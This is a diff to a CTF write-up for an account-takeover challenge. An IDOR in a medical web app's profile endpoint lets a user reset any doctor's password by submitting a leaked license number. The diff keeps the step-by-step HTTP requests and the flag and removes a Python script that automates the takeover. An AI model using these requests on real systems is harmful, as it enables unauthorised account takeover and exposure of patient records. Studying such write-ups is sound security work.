@@ -6,20 +6,20 @@ tags:
   - idor
   - auth
   - aussiemed
-description: An IDOR in the profile update endpoint lets you take over any doctor account by submitting their license number. 270 points.
+description: An IDOR in the profile update endpoint lets you take over any doctor account by submitting their license number.
 ---
-# AussieMed CTF — "What's Up Doc?" (270)
+# "What's Up Doc?"
 
-**Challenge:** https://nej3tgmbyzb6.aussiemed.ctf.urisc.club/login/
+**Challenge:** https://ctf.urisc.club/challenges#What's%20Up%20Doc?-18
 
-**Goal:** You can log in as a registered user, but there's "nothing here" — you need to escalate to a **doctor** account and grab the flag.
+**Goal:** You're in, but there's nothing here? Seems like we need to go deeper. Can we get more access as a doctor?
 
 **Flag:**
-- `SRCTF!{an_apple_a_day}` — on the dashboard of a doctor
+- `SRCTF!{an_apple_a_day}` - on the dashboard of any pre-registered doctor
 
 ---
 
-## The vulnerability
+## Vulernability
 
 `POST /dashboard/profile` has an **IDOR (Insecure Direct Object Reference)**.
 
@@ -33,9 +33,9 @@ GET /api/users/getRegistered
 
 ...which returns every registered user including their `License`, `Name`, `Manager`, and `Organisation`.
 
-## Exploit steps (easiest path)
+## Attack Path
 
-### 1. Log in as the registered user
+### 1. Log in as the newly registered user (from patient-zero)
 
 ```
 POST /login/
@@ -70,7 +70,7 @@ Send the doctor's license to the profile update endpoint with a **new password**
 POST /dashboard/profile
 license=MED0000282459
 full_name=Dr. Ingrid Solberg
-password=pwned123
+password=pwd
 ```
 
 The server updates **Dr. Ingrid Solberg's** password because it looks up by the submitted license.
@@ -80,7 +80,7 @@ The server updates **Dr. Ingrid Solberg's** password because it looks up by the 
 ```
 POST /login/
 license=MED0000282459
-password=pwned123
+password=pwd
 ```
 
 ### 5. Grab the flag
@@ -95,42 +95,8 @@ The dashboard now shows the news card:
 Doctors must stay up-to-date with patient privacy laws! SRCTF!{an_apple_a_day}
 ```
 
-As the doctor you also get access to patients, prescription records (PDFs), and the internal messaging system.
-
 ---
-
-## One-liner (Python)
-
-```python
-import requests
-
-BASE = "https://nej3tgmbyzb6.aussiemed.ctf.urisc.club"
-s = requests.Session()
-
-# 1. login as registered user
-s.post(f"{BASE}/login/", data={"license": "MED0012345678", "password": "test"})
-
-# 2. leak doctor licenses
-doctors = s.get(f"{BASE}/api/users/getRegistered").json()
-target = doctors[0]["License"]           # e.g. MED0000282459
-name = doctors[0]["Name"]                # e.g. Dr. Ingrid Solberg
-
-# 3. IDOR: reset the doctor's password
-s.post(f"{BASE}/dashboard/profile",
-       data={"license": target, "full_name": name, "password": "pwned123"})
-
-# 4. log in as the doctor
-s2 = requests.Session()
-s2.post(f"{BASE}/login/", data={"license": target, "password": "pwned123"})
-
-# 5. flag!
-dash = s2.get(f"{BASE}/dashboard/").text
-import re
-print(re.findall(r"SRCTF!\{[^}]+\}", dash))
-```
 
 ## Notes
 
-- Registration is wide open: the register page's hidden `isLicensed` field is set client-side and never validated server-side (`/verifyLicense` always returns `{"licensed":false}`).
-- Managers (`/api/getManagers/`) use numeric IDs, not licenses, so the same IDOR can't reach them — doctor is the intended target.
-- Don't forget to restore the doctor's name if you changed it (polite to leave the challenge state clean for others).
+- This was MUCH easier than we originally thought. After spending about two and a half hours trying to unsign what we thought was a session token using the Flask session key, we realised there was a directly accessible API endpoint `(/api/users/getRegistered/)` that returned the registered users. How embarrassing!
